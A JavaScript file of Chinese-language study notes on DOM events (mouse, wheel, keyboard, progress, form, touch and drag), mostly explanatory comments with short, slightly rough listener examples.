// MouseEvent.pageY属性返回与文档上侧边缘的距离（单位像素）。
// 它们的返回值都包括文档不可见的部分。这两个属性都是只读。
// 页面高度为2000像素，会产生垂直滚动条。滚动到页面底部，
// 点击鼠标输出的pageY值会接近2000。
/* HTML 代码如下
  <style>
    body {
      height: 2000px;
    }
  </style>
*/
document.body.addEventListener(
    'click',
    function (e) {
        console.log(e.pageX);
        console.log(e.pageY);
    },
    false
);
// MouseEvent.relatedTarget
// MouseEvent.relatedTarget属性返回事件的相关节点。
// 对于那些没有相关节点的事件，该属性返回null。该属性只读。
// 下表列出不同事件的target属性值和relatedTarget属性值义
// 事件名称	    target 属性	relatedTarget 属性
// focusin	    接受焦点的节点	丧失焦点的节点
// focusout	    丧失焦点的节点	接受焦点的节点
// mouseenter	将要进入的节点	将要离开的节点
// mouseleave	将要离开的节点	将要进入的节点
// mouseout	    将要离开的节点	将要进入的节点
// mouseover	将要进入的节点	将要离开的节点
// dragenter	将要进入的节点	将要离开的节点
// dragexit	    将要离开的节点	将要进入的节点
// 一个例子
/*
  HTML 代码如下
  <div id="outer" style="height:50px;width:50px;border-width:1px solid black;">
    <div id="inner" style="height:25px;width:25px;border:1px solid black;"></div>
  </div>
*/
var inner = document.getElementById('inner');
inner.addEventListener('mouseover', function (event) {
    console.log('进入' + event.target.id + ' 离开' + event.relatedTarget.id);
}, false);
inner.addEventListener('mouseenter', function (event) {
    console.log('进入' + event.target.id + ' 离开' + event.relatedTarget.id);
});
inner.addEventListener('mouseout', function () {
    console.log('离开' + event.target.id + ' 进入' + event.relatedTarget.id);
});
inner.addEventListener("mouseleave", function () {
    console.log('离开' + event.target.id + ' 进入' + event.relatedTarget.id);
});
// 鼠标从 outer 进入inner，输出
// 进入inner 离开outer
// 进入inner 离开outer
// 鼠标从 inner进入 outer，输出
// 离开inner 进入outer
// 离开inner 进入outer
// MouseEvent 接口的实例方法
// MouseEvent.getModifierState()
// 返回一个布尔值，表示有没有按下特定的功能键。它的参数是一个表示功能键的字符串。
// 代码可以了解用户是否按下了大写键。
document.addEventListener('click', function (e) {
    console.log(e.getModifierState('CapsLock'));
}, false);
// WheelEvent 接口
// // 概述
// WheelEvent 接口继承了 MouseEvent 实例，代表鼠标滚轮事件的实例对象。
// 目前，鼠标滚轮相关的事件只有一个wheel事件，用户滚动鼠标的滚轮，就生成这个事件的实例。
// 浏览器原生提供WheelEvent()构造函数，用来生成WheelEvent实例。
var wheelEvent = new WheelEvent(type, options);
// WheelEvent()构造函数可以接受两个参数，
// 第一个是字符串，表示事件类型，对于滚轮事件来说，这个值目前只能是wheel。
// 第二个参数是事件的配置对象。该对象的属性除了Event、UIEvent的配置属性以外，
// 还可以接受以下几个属性，所有属性都是可选的。
// deltaX：数值，表示滚轮的水平滚动量，默认值是 0.0。
// deltaY：数值，表示滚轮的垂直滚动量，默认值是 0.0。
// deltaZ：数值，表示滚轮的 Z 轴滚动量，默认值是 0.0。
// deltaMode：数值，表示相关的滚动事件的单位，
// 适用于上面三个属性。0表示滚动单位为像素，1表示单位为行，2表示单位为页，默认为0。
// 实例属性
// WheelEvent事件实例除了具有Event和MouseEvent的实例属性和实例方法，
// 还有一些自己的实例属性，但是没有自己的实例方法。
// 下面的属性都是只读属性。
// WheelEvent.deltaX：数值，表示滚轮的水平滚动量。
// WheelEvent.deltaY：数值，表示滚轮的垂直滚动量。
// WheelEvent.deltaZ：数值，表示滚轮的 Z 轴滚动量。
// WheelEvent.deltaMode：数值，表示上面三个属性的单位，0是像素，1是行，2是页。
//=====
// 键盘事件
// 键盘事件的种类
// 键盘事件由用户击打键盘触发，主要有keydown、keypress、keyup三个事件，
// 它们都继承了KeyboardEvent接口。
// keydown：按下键盘时触发。
// keypress：按下有值的键时触发，即按下 Ctrl、Alt、Shift、Meta 这样无值的键，
// 这个事件不会触发。对于有值的键，按下时先触发keydown事件，再触发这个事件。
// keyup：松开键盘时触发该事件。
// 如果用户一直按键不松开，就会连续触发键盘事件，触发的顺序如下。
// keydown
// keypress
// keydown
// keypress
// ...（重复以上过程）
// keyup
// KeyboardEvent 接口概述
// KeyboardEvent接口用来描述用户与键盘的互动。这个接口继承了Event接口，
// 并且定义了自己的实例属性和实例方法。
// 浏览器原生提供KeyboardEvent构造函数，用来新建键盘事件的实例。
new KeyboardEvent(type, options)
// KeyboardEvent构造函数接受两个参数。第一个参数是字符串，表示事件类型；
// 第二个参数是一个事件配置对象，该参数可选。
// 除了Event接口提供的属性，还可以配置以下字段，它们都是可选。
// key：字符串，当前按下的键，默认为空字符串。
// code：字符串，表示当前按下的键的字符串形式，默认为空字符串。
// location：整数，当前按下的键的位置，默认为0。
// ctrlKey：布尔值，是否按下 Ctrl 键，默认为false。
// shiftKey：布尔值，是否按下 Shift 键，默认为false。
// altKey：布尔值，是否按下 Alt 键，默认为false。
// metaKey：布尔值，是否按下 Meta 键，默认为false。
// repeat：布尔值，是否重复按键，默认为false。
// KeyboardEvent 的实例属性
// KeyboardEvent.altKey，KeyboardEvent.ctrlKey，KeyboardEvent.metaKey，KeyboardEvent.shiftKey
// 都是只读属性，返回一个布尔值，表示是否按下对应的键。
// KeyboardEvent.altKey：是否按下 Alt 键
// KeyboardEvent.ctrlKey：是否按下 Ctrl 键
// KeyboardEvent.metaKey：是否按下 meta 键（Mac 系统是一个四瓣的小花，Windows 系统是 windows 键）
// KeyboardEvent.shiftKey：是否按下 Shift 键
// 一个示例。
function showChar(e) {
    console.log('ALT: ' + e.altKey);
    console.log('CTRL: ' + e.ctrlKey);
    console.log('Meta: ' + e.metaKey);
    console.log('Shift: ' + e.shiftKey);
}
document.body.addEventListener('keydown', showChar, false);
// KeyboardEvent.code
// 返回一个字符串，表示当前按下的键的字符串形式。该属性只读。
// 下面是一些常用键的字符串形式，其他键请查文档。
// 数字键0 - 9：返回digital0 - digital9
// 字母键A - z：返回KeyA - KeyZ
// 功能键F1 - F12：返回 F1 - F12
// 方向键：返回ArrowDown、ArrowUp、ArrowLeft、ArrowRight
// Alt 键：返回AltLeft或AltRight
// Shift 键：返回ShiftLeft或ShiftRight
// Ctrl 键：返回ControlLeft或ControlRight
// KeyboardEvent.key  
// KeyboardEvent.key属性返回一个字符串，表示按下的键名。该属性只读。
// 如果按下的键代表可打印字符，则返回这个字符，比如数字、字母。
// 如果按下的键代表不可打印的特殊字符，则返回预定义的键值，
// 比如 Backspace，Tab，Enter，Shift，Control，Alt，CapsLock，Esc，Spacebar，PageUp，PageDown，End，Home，Left，Right，Up，Down，PrintScreen，Insert，Del，Win，F1～F12，NumLock，Scroll 等。
// 如果同时按下一个控制键和一个符号键，则返回符号键的键名。
// 比如，按下 Ctrl + a，则返回a；按下 Shift + a，则返回大写的A。
// 如果无法识别键名，返回字符串Unidentified
// KeyboardEvent.location 
// KeyboardEvent.location属性返回一个整数，表示按下的键处在键盘的哪一个区域。
// 它可能取以下值。
// 0：处在键盘的主区域，或者无法判断处于哪一个区域。
// 1：处在键盘的左侧，只适用那些有两个位置的键（比如 Ctrl 和 Shift 键）。
// 2：处在键盘的右侧，只适用那些有两个位置的键（比如 Ctrl 和 Shift 键）。
// 3：处在数字小键盘。
// KeyboardEvent.repeat
// 返回一个布尔值，代表该键是否被按着不放，以便判断是否重复这个键，
// 即浏览器会持续触发keydown和keypress事件，直到用户松开手为止
// KeyboardEvent 的实例方法
// KeyboardEvent.getModifierState() 
// 返回一个布尔值，表示是否按下或激活指定的功能键。它的常用参数如下。
// Alt：Alt 键
// CapsLock：大写锁定键
// Control：Ctrl 键
// Meta：Meta 键
// NumLock：数字键盘开关键
// Shift：Shift 键
// 只要Control、Alt、Meta里面，同时按下任意两个或两个以上的键就返回。
if (
    event.getModifierState('Control') +
    event.getModifierState('Alt') +
    event.getModifierState('Meta') > 1
) {
    return;
}
//=====
// 进度事件
// 进度事件的种类
// 进度事件用来描述资源加载的进度，主要由 AJAX 请求、<img>、<audio>、<video>、<style>、
// <link>等外部资源的加载触发，继承了ProgressEvent接口。它主要包含以下几种事件。
// abort：外部资源中止加载时（比如用户取消）触发。如果发生错误导致中止，不会触发该事件。
// error：由于错误导致外部资源无法加载时触发。
// load：外部资源加载成功时触发。
// loadstart：外部资源开始加载时触发。
// loadend：外部资源停止加载时触发，发生顺序排在error、abort、load等事件的后面。
// progress：外部资源加载过程中不断触发。
// timeout：加载超时时触发。
// 注意，除了资源下载，文件上传也存在这些事件。
// 一个例子。
// 在图片元素加载完成后，为图片元素添加一个finished的 Class。
// 如果加载失败，就把图片元素的样式设置为不显示
image.addEventListener('load', function (event) {
    image.classList.add('finished');
});
image.addEventListener('error', function (event) {
    image.style.display = 'none';
});
// 有时候，图片加载会在脚本运行之前就完成，尤其是当脚本放置在网页底部的时候，
// 因此有可能load和error事件的监听函数根本不会执行。
// 所以，比较可靠的方式，是用complete属性先判断一下是否加载完成。
function loaded() {
    // ...
}
if (image.complete) {
    loaded();
} else {
    image.addEventListener('load', loaded);
}
// 由于 DOM 的元素节点没有提供是否加载错误的属性，所以error事件的监听函数
// 最好放在<img>元素的 HTML 代码中，这样才能保证发生加载错误时百分之百会执行。
// 另外，error事件有一个特殊的性质，就是不会冒泡。所以，子元素的error事件，
// 不会触发父元素的error事件监听函数
<
img src = "/wrong/url"
onerror = "this.style.display='none';" / >
    // loadend事件的监听函数，可以用来取代abort事件、load事件、error事件的监听函数，
    // 因为它总是在这些事件之后发生。
    // loadend事件本身不提供关于进度结束的原因，但可以用它来做所有加载结束场景
    // 都需要做的一些操作。
    req.addEventListener('loadend', loadEnd, false);

function loadEnd(e) {
    console.log('传输结束，成功失败未知');
}
// ProgressEvent 接口
// ProgressEvent接口主要用来描述外部资源加载的进度，比如 AJAX 加载、<img>、
// <video>、<style>、<link>等外部资源加载。进度相关的事件都继承了这个接口。
// 浏览器原生提供了ProgressEvent()构造函数，用来生成事件实例。
// new ProgressEvent(type, options)
// ProgressEvent()构造函数接受两个参数。
// 第一个参数是字符串，表示事件的类型，这个参数是必须的。
// 第二个参数是一个配置对象，表示事件的属性，该参数可选。
// 配置对象除了可以使用Event接口的配置属性，还可以使用下面的属性，所有这些属性都是可选的。
// lengthComputable：布尔值，表示加载的总量是否可以计算，默认是false。
// loaded：整数，表示已经加载的量，默认是0。
// total：整数，表示需要加载的总量，默认是0。
// ProgressEvent具有对应的实例属性。
// ProgressEvent.lengthComputable
// ProgressEvent.loaded
// ProgressEvent.total
// 如果ProgressEvent.lengthComputable为false，ProgressEvent.total实际上是没有意义的。
// 一个例子。
// 先构造一个load事件，抛出后被监听函数捕捉到
var p = new ProgressEvent('load', {
    lengthComputable: true,
    loaded: 30,
    total: 100,
});
document.body.addEventListener('load', function (e) {
    console.log('已经加载：' + (e.loaded / e.total) * 100 + '%');
});
document.body.dispatchEvent(p); // 已经加载：30%
// 一个实际的例子
var xhr = new XMLHttpRequest();
xhr.addEventListener('progress', updateProgress, false);
xhr.addEventListener('load', transferComplete, false);
xhr.addEventListener('error', transferFailed, false);
xhr.addEventListener('abort', transferCanceled, false);
xhr.open();

function updateProgress(e) {
    if (e.lengthComputable) {
        var percentComplete = e.loaded / e.total;
    } else {
        console.log('不能计算进度');
    }
}

function transferComplete(e) {
    console.log('传输结束');
}

function transferFailed(evt) {
    console.log('传输过程中发生错误');
}

function transferCanceled(evt) {
    console.log('用户取消了传输');
}
// 上面是下载过程的进度事件，还存在上传过程的进度事件。
// 这时所有监听函数都要放在XMLHttpRequest.upload对象上面。
var xhr = new XMLHttpRequest();
xhr.upload.addEventListener('progress', updateProgress, false);
xhr.upload.addEventListener('load', transferComplete, false);
xhr.upload.addEventListener('error', transferFailed, false);
xhr.upload.addEventListener('abort', transferCanceled, false);
xhr.open();
//======
// 表单事件
// 表单事件的种类
// input 事件
// input事件当<input>、<select>、<textarea>的值发生变化时触发。
// 对于复选框（<input type=checkbox>）或单选框（<input type=radio>），
// 用户改变选项时，也会触发这个事件。
// 另外，对于打开contenteditable属性的元素，只要值发生变化，也会触发input事件。
// input事件的一个特点，就是会连续触发，比如用户每按下一次按键，就会触发一次input事件。
// input事件对象继承了InputEvent接口。
// 该事件跟change事件很像，不同之处在于input事件在元素的值发生变化后立即发生，
// 而change在元素失去焦点时发生，而内容此时可能已经变化多次。
// 也就是说，如果有连续变化，input事件会触发多次，而change事件只在失去焦点时触发一次。
// 改变下拉框选项时，会触发input事件，从而执行回调函数inputHandler
/* HTML 代码如下
<select id="mySelect">
  <option value="1">1</option>
  <option value="2">2</option>
  <option value="3">3</option>
</select>
*/
function inputHandler(e) {
    console.log(e.target.value)
}
var mySelect = document.querySelector('#mySelect');
mySelect.addEventListener('input', inputHandler);
// select 事件
// select事件当在<input>、<textarea>里面选中文本时触发
// 选中的文本可以通过event.target元素的selectionDirection、
// selectionEnd、selectionStart和value属性拿到。
// <input id="test" type="text" value="Select me!" />
var elem = document.getElementById('test');
elem.addEventListener('select', function (e) {
    console.log(e.type); // "select"
}, false);
// change 事件
// change事件当<input>、<select>、<textarea>的值发生变化时触发。
// 它与input事件的最大不同，就是不会连续触发，只有当全部修改完成时才会触发，
// 另一方面input事件必然伴随change事件。
// 具体来说，分成以下几种情况。
// 激活单选框（radio）或复选框（checkbox）时触发。
// 用户提交时触发。比如，从下列列表（select）完成选择，在日期或文件输入框完成选择。
// 当文本框或<textarea>元素的值发生改变，并且丧失焦点时触发。
// 对于<select>元素来说，input和change事件基本是等价的。
// <select size="1" onchange="changeEventHandler(event);">
//   <option>chocolate</option>
//   <option>strawberry</option>
//   <option>vanilla</option>
// </select>
function changeEventHandler(event) {
    console.log(event.target.value);
}
// invalid 事件
// 用户提交表单时，如果表单元素的值不满足校验条件，就会触发invalid事件
// 代码中，输入框是必填的。如果不填，用户点击按钮提交时，
// 就会触发输入框的invalid事件，导致提交被取消
{
    /* <form>
      <input type="text" required oninvalid="console.log('invalid input')" />
      <button type="submit">提交</button>
    </form> */
}
// reset 事件，submit 事件
// 这两个事件发生在表单对象<form>上，而不是发生在表单的成员上。
// reset事件当表单重置（所有表单成员变回默认值）时触发。
// submit事件当表单数据向服务器提交时触发。注意，submit事件的发生对象是<form>元素，
// 而不是<button>元素，因为提交的是表单，而不是按钮
// InputEvent 接口
// InputEvent接口主要用来描述input事件的实例。
// 该接口继承了Event接口，还定义了一些自己的实例属性和实例方法。
// 浏览器原生提供InputEvent()构造函数，用来生成实例对象。
new InputEvent(type, options)
// InputEvent构造函数可以接受两个参数。
// 第一个参数是字符串，表示事件名称，该参数是必需的。
// 第二个参数是一个配置对象，用来设置事件实例的属性，该参数是可选的。
// 配置对象的字段除了Event构造函数的配置属性，还可以设置下面的字段，这些字段都是可选的。
// inputType：字符串，表示发生变更的类型。
// data：字符串，表示插入的字符串。如果没有插入的字符串（比如删除操作），
// 则返回null或空字符串。
// dataTransfer：返回一个 DataTransfer 对象实例，该属性通常只在输入框接受
// 富文本输入时有效。
// InputEvent的实例属性主要就是上面三个属性，这三个实例属性都是只读的
// InputEvent.data
// InputEvent.data属性返回一个字符串，表示变动的内容
// 代码中，如果手动在输入框里面输入abc，控制台会先输出a，再在下一行输出b，
// 再在下一行输出c。然后选中abc，一次性将它们删除，控制台会输出null或一个空字符串。
// <input type="text" id="myInput">
var input = document.getElementById('myInput');
input.addEventListener('input', myFunction, false);

function myFunction(e) {
    console.log(e.data);
}
// InputEvent.inputType
// 返回一个字符串，表示字符串发生变更的类型。
// 对于常见情况，Chrome 浏览器的返回值如下。完整列表可以参考文档。
// 手动插入文本：insertText
// 粘贴插入文本：insertFromPaste
// 向后删除：deleteContentBackward
// 向前删除：deleteContentForward
// InputEvent.dataTransfer
// 返回一个 DataTransfer 实例。该属性只在文本框
// 接受粘贴内容（insertFromPaste）或拖拽内容（insertFromDrop）时才有效
// =====
// 触摸事件
// 触摸操作概述
// 浏览器的触摸 API 由三个部分组成。
// Touch：一个触摸点
// TouchList：多个触摸点的集合
// TouchEvent：触摸引发的事件实例
// Touch接口的实例对象用来表示触摸点（一根手指或者一根触摸笔），
// 包括位置、大小、形状、压力、目标元素等属性。
// 有时，触摸动作由多个触摸点（多根手指）组成，
// 多个触摸点的集合由TouchList接口的实例对象表示。
// TouchEvent接口的实例对象代表由触摸引发的事件，只有触摸屏才会引发这一类事件。
// 很多时候，触摸事件和鼠标事件同时触发，即使这个时候并没有用到鼠标。
// 这是为了让那些只定义鼠标事件、没有定义触摸事件的代码，在触摸屏的情况下仍然能用。
// 如果想避免这种情况，可以用event.preventDefault方法阻止发出鼠标事件。
// Touch 接口
// Touch 接口概述
// Touch 接口代表单个触摸点。触摸点可能是一根手指，也可能是一根触摸笔。
// 浏览器原生提供Touch构造函数，用来生成Touch实例。
// var touch = new Touch(touchOptions);
// Touch构造函数接受一个配置对象作为参数，它有以下属性。
// identifier：必需，类型为整数，表示触摸点的唯一 ID。
// target：必需，类型为元素节点，表示触摸点开始时所在的网页元素。
// clientX：可选，类型为数值，表示触摸点相对于浏览器窗口左上角的水平距离，默认为0。
// clientY：可选，类型为数值，表示触摸点相对于浏览器窗口左上角的垂直距离，默认为0。
// screenX：可选，类型为数值，表示触摸点相对于屏幕左上角的水平距离，默认为0。
// screenY：可选，类型为数值，表示触摸点相对于屏幕左上角的垂直距离，默认为0。
// pageX：可选，类型为数值，表示触摸点相对于网页左上角的水平位置（即包括页面的滚动距离），
// 默认为0。
// pageY：可选，类型为数值，表示触摸点相对于网页左上角的垂直位置（即包括页面的滚动距离），
// 默认为0。
// radiusX：可选，类型为数值，表示触摸点周围受到影响的椭圆范围的 X 轴半径，默认为0。
// radiusY：可选：类型为数值，表示触摸点周围受到影响的椭圆范围的 Y 轴半径，默认为0。
// rotationAngle：可选，类型为数值，表示触摸区域的椭圆的旋转角度，
// 单位为度数，在0到90度之间，默认值为0。
// force：可选，类型为数值，范围在0到1之间，表示触摸压力。
// 0代表没有压力，1代表硬件所能识别的最大压力，默认为0。
// Touch 接口的实例属性
// （1）Touch.identifier
// Touch.identifier属性返回一个整数，表示触摸点的唯一 ID。
// 这个值在整个触摸过程保持不变，直到触摸事件结束。
someElement.addEventListener('touchmove', function (e) {
    for (var i = 0; i < e.changedTouches.length; i++) {
        console.log(e.changedTouches[i].identifier);
    }
}, false);
// （2）Touch.screenX，Touch.screenY，Touch.clientX，Touch.clientY，pageX，pageY
// Touch.screenX属性和Touch.screenY属性，分别表示触摸点相对于屏幕左上角的横坐标和纵坐标，
// 与页面是否滚动无关。
// Touch.clientX属性和Touch.clientY属性，分别表示触摸点相对于浏览器视口左上角的横坐标
// 和纵坐标，与页面是否滚动无关。
// Touch.pageX属性和Touch.pageY属性，分别表示触摸点相对于当前页面左上角的横坐标
// 和纵坐标，包含了页面滚动带来的位移。
// （3）Touch.radiusX，Touch.radiusY，Touch.rotationAngle
// Touch.radiusX属性和Touch.radiusY属性，分别返回触摸点周围受到影响的
// 椭圆范围的 X 轴半径和 Y 轴半径，单位为像素。乘以 2 就可以得到触摸范围的宽度和高度。
// Touch.rotationAngle属性表示触摸区域的椭圆的旋转角度，单位为度数，在0到90度之间。
// 上面这三个属性共同定义了用户与屏幕接触的区域，对于描述手指这一类非精确的触摸，
// 很有帮助。指尖接触屏幕，触摸范围会形成一个椭圆，这三个属性就用来描述这个椭圆区域。
// 下面是一个示例。
div.addEventListener('touchstart', rotate);
div.addEventListener('touchmove', rotate);
div.addEventListener('touchend', rotate);

function rotate(e) {
    var touch = e.changedTouches.item(0);
    e.preventDefault();
    src.style.width = touch.radiusX * 2 + 'px';
    src.style.height = touch.radiusY * 2 + 'px';
    src.style.transform = 'rotate(' + touch.rotationAngle + 'deg)';
};
// （4）Touch.force
// Touch.force属性返回一个0到1之间的数值，表示触摸压力。
// 0代表没有压力，1代表硬件所能识别的最大压力。
// （5）Touch.target
// Touch.target属性返回一个元素节点，代表触摸发生时所在的那个元素节点。
// 即使触摸点已经离开了这个节点，该属性依然不变。
// TouchList 接口 
// TouchList接口表示一组触摸点的集合。它的实例是一个类似数组的对象，
// 成员是Touch的实例对象，表示所有触摸点。用户用三根手指触摸，
// 产生的TouchList实例就会包含三个成员，每根手指的触摸点对应一个Touch实例对象。
// 它的实例主要通过触摸事件的
// TouchEvent.touches、
// TouchEvent.changedTouches、
// TouchEvent.targetTouches这几个属性获取。
// 它的实例属性和实例方法只有两个。
// TouchList.length：数值，表示成员数量（即触摸点的数量）。
// TouchList.item()：返回指定位置的成员，它的参数是该成员的位置编号（从零开始）。
// TouchEvent 接口
// 概述
// TouchEvent 接口继承了 Event 接口，表示由触摸引发的事件实例，通常来自触摸屏或轨迹板。
// 除了被继承的属性以外，它还有一些自己的属性。
// 浏览器原生提供TouchEvent()构造函数，用来生成触摸事件的实例。
new TouchEvent(type, options)
// TouchEvent()构造函数可以接受两个参数，第一个参数是字符串，表示事件类型；
// 第二个参数是事件的配置对象，该参数是可选的，对象的所有属性也是可选的。
// 除了Event接口的配置属性，该接口还有一些自己的配置属性。
// touches：TouchList实例，代表所有的当前处于活跃状态的触摸点，默认值是一个空数组[]。
// targetTouches：TouchList实例，代表所有处在触摸的目标元素节点内部、
// 且仍然处于活动状态的触摸点，默认值是一个空数组[]。
// changedTouches：TouchList实例，代表本次触摸事件的相关触摸点，
// 默认值是一个空数组[]。
// ctrlKey：布尔值，表示 Ctrl 键是否同时按下，默认值为false。
// shiftKey：布尔值，表示 Shift 键是否同时按下，默认值为false。
// altKey：布尔值，表示 Alt 键是否同时按下，默认值为false。
// metaKey：布尔值，表示 Meta 键（或 Windows 键）是否同时按下，默认值为false。
// 实例属性
// TouchEvent 接口的实例具有Event实例的所有属性和方法，
// 此外还有一些它自己的实例属性，这些属性全部都是只读。
// TouchEvent.altKey，TouchEvent.ctrlKey，TouchEvent.shiftKey，TouchEvent.metaKey
// TouchEvent.altKey：布尔值，表示触摸时是否按下了 Alt 键。
// TouchEvent.ctrlKey：布尔值，表示触摸时是否按下了 Ctrl 键。
// TouchEvent.shiftKey：布尔值：表示触摸时是否按下了 Shift 键。
// TouchEvent.metaKey：布尔值，表示触摸时是否按下了 Meta 键（或 Windows 键）。
// 下面是一个示例。
someElement.addEventListener('touchstart', function (e) {
    console.log('altKey = ' + e.altKey);
    console.log('ctrlKey = ' + e.ctrlKey);
    console.log('metaKey = ' + e.metaKey);
    console.log('shiftKey = ' + e.shiftKey);
}, false);
// TouchEvent.changedTouches
// TouchEvent.changedTouches属性返回一个TouchList实例，
// 成员是一组Touch实例对象，表示本次触摸事件的相关触摸点。
// 对于不同的事件，该属性的含义有所不同。
// touchstart事件：被激活的触摸点
// touchmove事件：发生变化的触摸点
// touchend事件：消失的触摸点（即不再被触碰的点）
// 下面是一个示例。
someElement.addEventListener('touchmove', function (e) {
    for (var i = 0; i < e.changedTouches.length; i++) {
        console.log(e.changedTouches[i].identifier);
    }
}, false);
// TouchEvent.touches
// TouchEvent.touches属性返回一个TouchList实例，成员是所有仍然
// 处于活动状态（即触摸中）的触摸点。一般来说，一个手指就是一个触摸点。
// 下面是一个示例。
someElement.addEventListener('touchstart', function (e) {
    switch (e.touches.length) {
        // 一根手指触摸
        case 1:
            handle_one_touch(e);
            break;
            // 两根手指触摸
        case 2:
            handle_two_touches(e);
            break;
            // 三根手指触摸
        case 3:
            handle_three_touches(e);
            break;
            // 其他情况
        default:
            console.log('Not supported');
            break;
    }
}, false);
// TouchEvent.targetTouches
// TouchEvent.targetTouches属性返回一个TouchList实例，成员是触摸事件的
// 目标元素节点内部、所有仍然处于活动状态（即触摸中）的触摸点。
// 代码用来判断，是否所有触摸点都在目标元素内。
function touches_in_target(ev) {
    return (ev.touches.length === ev.targetTouches.length ? true : false);
}
// 触摸事件的种类
// 触摸引发的事件，有以下几种。
// 可以通过TouchEvent.type属性，查看到底发生的是哪一种事件。
// touchstart：用户开始触摸时触发，它的target属性返回发生触摸的元素节点。
// touchend：用户不再接触触摸屏时（或者移出屏幕边缘时）触发，它的target属性
// 与touchstart事件一致的，就是开始触摸时所在的元素节点。
// 它的changedTouches属性返回一个TouchList实例，
// 包含所有不再触摸的触摸点（即Touch实例对象）。
// touchmove：用户移动触摸点时触发，它的target属性与touchstart事件一致。
// 如果触摸的半径、角度、力度发生变化，也会触发该事件。
// touchcancel：触摸点取消时触发，比如在触摸区域跳出一个模态窗口（modal window）、
// 触摸点离开了文档区域（进入浏览器菜单栏）、
// 用户的触摸点太多，超过了支持的上限（自动取消早先的触摸点）。
// 下面是一个例子。
var el = document.getElementsByTagName('canvas')[0];
el.addEventListener('touchstart', handleStart, false);
el.addEventListener('touchmove', handleMove, false);

function handleStart(evt) {
    evt.preventDefault();
    var touches = evt.changedTouches;
    for (var i = 0; i < touches.length; i++) {
        console.log(touches[i].pageX, touches[i].pageY);
    }
}

function handleMove(evt) {
    evt.preventDefault();
    var touches = evt.changedTouches;
    for (var i = 0; i < touches.length; i++) {
        var touch = touches[i];
        console.log(touch.pageX, touch.pageY);
    }
}
//======
// 拖拉事件
// 拖拉事件的种类
// 拖拉（drag）指的是，用户在某个对象上按下鼠标键不放，
// 拖动它到另一个位置，然后释放鼠标键，将该对象放在那里
// 拖拉的对象有好几种，包括元素节点、图片、链接、选中的文字等等。
// 在网页中，除了元素节点默认不可以拖拉，其他（图片、链接、选中的文字）都是可以直接拖拉的。
// 为了让元素节点可拖拉，可以将该节点的draggable属性设为true。
{
    /* <div draggable="true">此区域可拖拉</div> */
}
// draggable属性可用于任何元素节点，但是图片（<img>）和链接（<a>）不加这个属性，
// 就可以拖拉。对于它们，用到这个属性的时候，往往是将其设为false，防止拖拉这两种元素。
// 注意，一旦某个元素节点的draggable属性设为true，就无法再用鼠标选中该节点内部的
// 文字或子节点了。
// 当元素节点或选中的文本被拖拉时，就会持续触发拖拉事件，
// 包括以下一些事件。
// drag：拖拉过程中，在被拖拉的节点上持续触发（相隔几百毫秒）。
// dragstart：用户开始拖拉时，在被拖拉的节点上触发，该事件的target属性是被拖拉的节点。
// 通常应该在这个事件的监听函数中，指定拖拉的数据。
// dragend：拖拉结束时（释放鼠标键或按下 ESC 键）在被拖拉的节点上触发，该事件的target
// 属性是被拖拉的节点。它与dragstart事件，在同一个节点上触发。不管拖拉是否跨窗口，
// 或者中途被取消，dragend事件总是会触发的。
// dragenter：拖拉进入当前节点时，在当前节点上触发一次，该事件的target属性是当前节点。
// 通常应该在这个事件的监听函数中，指定是否允许在当前节点放下（drop）拖拉的数据。
// 如果当前节点没有该事件的监听函数，或者监听函数不执行任何操作，就意味着不允许在当前
// 节点放下数据。在视觉上显示拖拉进入当前节点，也是在这个事件的监听函数中设置。
// dragover：拖拉到当前节点上方时，在当前节点上持续触发（相隔几百毫秒），该事件的target
// 属性是当前节点。该事件与dragenter事件的区别是，dragenter事件在进入该节点时触发，
// 然后只要没有离开这个节点，dragover事件会持续触发。
// dragleave：拖拉操作离开当前节点范围时，在当前节点上触发，该事件的target属性是
// 当前节点。如果要在视觉上显示拖拉离开操作当前节点，就在这个事件的监听函数中设置。
// drop：被拖拉的节点或选中的文本，释放到目标节点时，在目标节点上触发。注意，
// 如果当前节点不允许drop，即使在该节点上方松开鼠标键，也不会触发该事件。
// 如果用户按下 ESC 键，取消这个操作，也不会触发该事件。该事件的监听函数负责
// 取出拖拉数据，并进行相关处理。
// 动态改变被拖动节点的背景色。
// div节点被拖动时，背景色会变为红色，拖动结束，又变回绿色
div.addEventListener('dragstart', function (e) {
    this.style.backgroundColor = 'red';
}, false);
div.addEventListener('dragend', function (e) {
    this.style.backgroundColor = 'green';
}, false);
// 实现将一个节点从当前父节点，拖拉到另一个父节点中
/* HTML 代码如下
 <div class="dropzone">
   <div id="draggable" draggable="true">
     该节点可拖拉
   </div>
 </div>
 <div class="dropzone"></div>
 <div class="dropzone"></div>
 <div class="dropzone"></div>
*/

// 被拖拉节点
var dragged;

document.addEventListener('dragstart', function (event) {
    // 保存被拖拉节点
    dragged = event.target;
    // 被拖拉节点的背景色变透明
    event.target.style.opacity = 0.5;
}, false);

document.addEventListener('dragend', function (event) {
    // 被拖拉节点的背景色恢复正常
    event.target.style.opacity = '';
}, false);

document.addEventListener('dragover', function (event) {
    // 防止拖拉效果被重置，允许被拖拉的节点放入目标节点
    event.preventDefault();
}, false);

document.addEventListener('dragenter', function (event) {
    // 目标节点的背景色变紫色
    // 由于该事件会冒泡，所以要过滤节点
    if (event.target.className === 'dropzone') {
        event.target.style.background = 'purple';
    }
}, false);

document.addEventListener('dragleave', function (event) {
    // 目标节点的背景色恢复原样
    if (event.target.className === 'dropzone') {
        event.target.style.background = '';
    }
}, false);

document.addEventListener('drop', function (event) {
    // 防止事件默认行为（比如某些元素节点上可以打开链接），
    event.preventDefault();
    if (event.target.className === 'dropzone') {
        // 恢复目标节点背景色
        event.target.style.background = '';
        // 将被拖拉节点插入目标节点
        dragged.parentNode.removeChild(dragged);
        event.target.appendChild(dragged);
    }
}, false);
// 关于拖拉事件，有以下几个注意点。
// 拖拉过程只触发以上这些拖拉事件，尽管鼠标在移动，但是鼠标事件不会触发。
// 将文件从操作系统拖拉进浏览器，不会触发dragstart和dragend事件。
// dragenter和dragover事件的监听函数，用来取出拖拉的数据（即允许放下被拖拉的元素）。
// 由于网页的大部分区域不适合作为放下拖拉元素的目标节点，
// 所以这两个事件的默认设置为当前节点不允许接受被拖拉的元素。
// 如果想要在目标节点上放下的数据，首先必须阻止这两个事件的默认行为。
{
    /* <div ondragover="return false">
    <div ondragover="event.preventDefault()"> */
}
// 上面代码中，如果不取消拖拉事件或者阻止默认行为，就不能在div节点上放下被拖拉的节点。
// DragEvent 接口
// 拖拉事件都继承了DragEvent接口，这个接口又继承了MouseEvent接口和Event接口。
// 浏览器原生提供一个DragEvent()构造函数，用来生成拖拉事件的实例对象
new DragEvent(type, options);
